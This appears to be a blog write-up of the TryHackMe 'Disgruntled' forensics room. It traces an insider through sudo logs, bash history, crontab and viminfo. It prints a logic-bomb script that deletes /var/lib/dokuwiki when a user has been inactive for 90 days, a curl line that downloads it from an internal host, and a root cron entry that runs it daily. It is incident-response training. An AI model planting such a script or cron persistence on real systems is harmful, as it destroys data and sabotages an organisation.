---
layout: post
category:
    - linux
    - tryhackme.easy
---
<img src="assets/img/Disgruntled_1-1--badr.png" style="height: 200px;" alt="Disgruntled">

## The log files
### Log files found | `ls -l /var/log/*.log*`
{% highlight diff linenos %}
-rw-r--r-- 1 root   root       0 Jun 29  2025 /var/log/alternatives.log
+-rw-r--r-- 1 root   root   43832 Feb 21  2025 /var/log/alternatives.log.1
+-rw-r----- 1 syslog adm     2718 Feb 26 11:00 /var/log/auth.log
+-rw-r----- 1 syslog adm    46826 Feb 26 09:49 /var/log/auth.log.1
+-rw-r----- 1 root   adm    73432 Feb 26 09:50 /var/log/cloud-init-output.log
+-rw-r----- 1 syslog adm   152721 Feb 26 09:50 /var/log/cloud-init.log
+-rw-r----- 1 syslog adm  1530618 Jun 29  2025 /var/log/cloud-init.log.1
+-rw-r--r-- 1 root   root     672 Feb 26 10:47 /var/log/dpkg.log
+-rw-r--r-- 1 root   root  905405 Feb 21  2025 /var/log/dpkg.log.1
+-rw-r--r-- 1 root   root    3840 Feb 21  2025 /var/log/fontconfig.log
+-rw-r----- 1 syslog adm     1580 Feb 26 09:50 /var/log/kern.log
+-rw-r----- 1 syslog adm    66443 Feb 26 09:49 /var/log/kern.log.1
+-rw-r----- 1 syslog adm   125985 Jun 29  2025 /var/log/kern.log.2.gz
-rw-r--r-- 1 root   root       0 Feb 26 09:49 /var/log/ubuntu-advantage.log
+-rw-r--r-- 1 root   root    1433 Feb 21  2025 /var/log/ubuntu-advantage.log.1
{% endhighlight %}
- `/var/log/auth.log`
    - Contains system authorization information, including user logins and authentication machinsm that were used.
- `/var/log/cloud-init-output.log`
- `/var/log/cloud-init.log`
- `/var/log/fontconfig.log`
- `/var/log/kern.log`
- `/var/log/alternatives.log`
- `/var/log/dpkg.log`
- `/var/log/ubuntu-advantage.log`

### The base output | `/var/log/auth.log.1`
A basic regular expression search, `grep -e "COMMAND=" /var/log/auth.log.1`
{% highlight diff linenos %}
Dec 22 07:56:27 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/date -s last year
Dec 22 07:56:36 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/nano /etc/ssh/sshd_config
Dec 22 07:57:45 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart ssh
Dec 22 07:58:09 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/useradd -m cybert -s /bin/bash
Dec 22 07:58:14 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/passwd cybert
Dec 22 07:58:24 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:17:30 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
Dec 28 06:18:12 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/rm /var/lib/dpkg/lock
Dec 28 06:18:17 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
Dec 28 06:18:33 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/lsof /var/lib/dpkg/lock
Dec 28 06:18:36 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/lsof /var/lib/dpkg/lock-frontend
Dec 28 06:18:47 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/rm /var/lib/dpkg/lock-frontend
Dec 28 06:18:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/dpkg --configure -a
Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
Dec 28 06:20:46 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /usr/share/dokuwiki
Dec 28 06:20:55 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /usr/share/dokuwiki/VERSION /usr/share/dokuwiki/bin /usr/share/dokuwiki/doku.php /usr/share/dokuwiki/feed.php /usr/share/dokuwiki/inc /usr/share/dokuwiki/index.php /usr/share/dokuwiki/install.php /usr/share/dokuwiki/lib /usr/share/dokuwiki/vendor -R
Dec 28 06:21:05 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /var/lib/dokuwiki
Dec 28 06:21:14 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/chown www-data:www-data /var/lib/dokuwiki/acl /var/lib/dokuwiki/data /var/lib/dokuwiki/inc /var/lib/dokuwiki/lib -R
Dec 28 06:21:20 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/ln -s /var/lib/dokuwiki/data /usr/share/dokuwiki/data
Dec 28 06:21:28 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/ln -s /etc/dokuwiki/license.php /usr/share/dokuwiki/conf/license.php
Dec 28 06:22:12 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/dokuwiki.conf
Dec 28 06:22:25 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/a2ensite dokuwiki
Dec 28 06:22:37 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/systemctl reload apache2
Dec 28 06:26:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/adduser it-admin
Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/usr/bin/vi bomb.sh
Dec 28 06:30:10 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/bin/nano /etc/crontab
Dec 28 07:01:22 ip-10-10-117-219 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/passwd root
Dec 28 07:01:30 ip-10-10-117-219 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/passwd root
Dec 28 07:14:07 ip-10-10-243-54 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/bin/nano /etc/ssh/sshd_config
Dec 28 07:14:27 ip-10-10-243-54 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/service sshd restart
Feb 21 17:45:45 ip-10-10-237-12 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/su
Feb 21 17:47:24 ip-10-10-237-12 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/su
Feb 21 17:49:33 ip-10-10-237-12 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/su
Feb 21 17:53:49 ip-10-10-237-12 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/su
Feb 21 18:08:30 ip-10-10-237-12 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/su
{% endhighlight %}
#### The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
{% highlight diff linenos %}
+Dec 28 06:17:30 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
+Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
{% endhighlight %}
#### What was the present working directory (PWD) when the previous command was run?
{% highlight diff linenos %}
+Dec 28 06:17:30 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
+Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
{% endhighlight %}
#### Which user was created after the package from the previous task was installed?
{% highlight diff linenos %}
+Dec 28 06:26:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/adduser it-admin
{% endhighlight %}
#### A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
{% highlight diff linenos %}
+Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
{% endhighlight %}
#### A script file was opened using the "vi" text editor. What is the name of this file?
{% highlight diff linenos %}
+Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/usr/bin/vi bomb.sh
{% endhighlight %}
#### What is the command used that created the file bomb.sh? | `cat /home/it-admin/.bash_history`
{% highlight diff linenos %}
whoami
+curl 10.10.158.38:8080/bomb.sh --output bomb.sh
ls
ls -la
cd ~/
+curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
ls
rm bomb.sh
sudo nano /etc/crontab
exit
{% endhighlight %}
#### The file was renamed and moved to a different directory. What is the full path of this file now? | `cat /etc/crontab`
{% highlight diff linenos %}
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+0 8	* * *	root	/bin/os-update.sh
#
{% endhighlight %}
#### When was the file from the previous question last modified? (Format: Month Day HH:MM) | `cat /home/it-admin/.viminfo`
{% highlight diff linenos %}
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:q!
|2,0,1672208992,,"q!"
:saveas /bin/os-update.sh
|2,0,1672208983,,"saveas /bin/os-update.sh"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# File marks:
'0  6  0  /bin/os-update.sh
|4,48,6,0,1672208992,"/bin/os-update.sh"

# Jumplist (newest first):
-'  6  0  /bin/os-update.sh
|4,39,6,0,1672208992,"/bin/os-update.sh"
-'  1  0  /bin/os-update.sh
|4,39,1,0,1672208955,"/bin/os-update.sh"

# History of marks within files (newest to oldest):

> /bin/os-update.sh
+	*	1672208988	0
	"	6	0
{% endhighlight %}
#### What is the name of the file that will get created when the file from the first question executes? | `cat /bin/os-update.sh`
{% highlight diff linenos %}
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
fi
{% endhighlight %}
#### At what time will the malicious file trigger? | `cat /etc/crontab`
{% highlight diff linenos %}
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+0 8	* * *	root	/bin/os-update.sh
#
{% endhighlight %}